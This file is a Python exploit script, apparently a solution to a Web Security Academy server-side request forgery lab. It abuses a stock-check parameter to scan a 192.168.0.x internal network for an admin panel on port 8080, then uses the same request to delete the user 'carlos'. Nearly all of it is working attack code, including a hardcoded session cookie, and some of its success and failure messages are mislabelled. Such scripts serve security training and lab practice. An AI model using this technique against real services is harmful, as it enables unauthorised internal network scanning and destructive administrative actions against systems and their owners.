import requests, sys, re, urllib3
import random, string
from bs4 import BeautifulSoup
from requests_toolbelt import MultipartEncoder

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

headers = {
    "Host": "0a920080030991dd81b93e82003d0007.web-security-academy.net",
    "Cookie": "session=sfbyoAXIxEq1Q7lC5SD54ZqTmmMqDUnO",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0",
    "Accept": "*/*",
    "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://0a920080030991dd81b93e82003d0007.web-security-academy.net/product?productId=1",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://0a920080030991dd81b93e82003d0007.web-security-academy.net",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Te": "trailers"
}

def ssrf_exploit(session, url) :
    
    stock_url = url + '/product/stock'
    stockApi_url = ''
    
    for i in range(1, 256) :
        data = {'stockApi':f'http://192.168.0.{i}:8080/admin'}
        res = session.post(stock_url, data=data, headers=headers, verify=False, proxies=proxies)

        if res.status_code == 200 :
            print("(+) The successful ip address of the internal network is 192.168.0.%s " % i)
            stockApi_url = f'http://192.168.0.{i}:8080'
            break
            
    if stockApi_url : 
        print("(+) Successfully retrieve the internal ip address.")
        data = {'stockApi':stockApi_url+'%2Fadmin'}
        res = session.post(stock_url, data=data, headers=headers, verify=False, proxies=proxies)

        if "carlos" in res.text :
            print("(+) Successfully access grant to the admin panel!")
            matches = re.search(r'<a\s+href="(.*\?.*carlos)">Delete<\/a>', res.text)
            
            if matches :
                print("(+) Successfully retrieve the csrf token.")
                delete_url = matches.group(1)
                
                if delete_url :
                    print("(+) Successfully has deleted the carlos user.")
                    data = {'stockApi':stockApi_url+delete_url}
                    res = session.post(stock_url, data=data, verify=False, proxies=proxies)
                else :
                    print("(+) Failed to delete the carlos user.")
                    sys.exit(-1)
            else :
                print("(-) Could grant the access to the admin panel.")
                sys.exit(-1)
        else :
            print("(-) Could not access the carlos user.")
            sys.exit(-1)
    else :
        print("(-) Failed to retrieve the internal ip address.")
        sys.exit(-1)

if __name__ == "__main__" :
    try :
        url = sys.argv[1]
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    ssrf_exploit(session, url)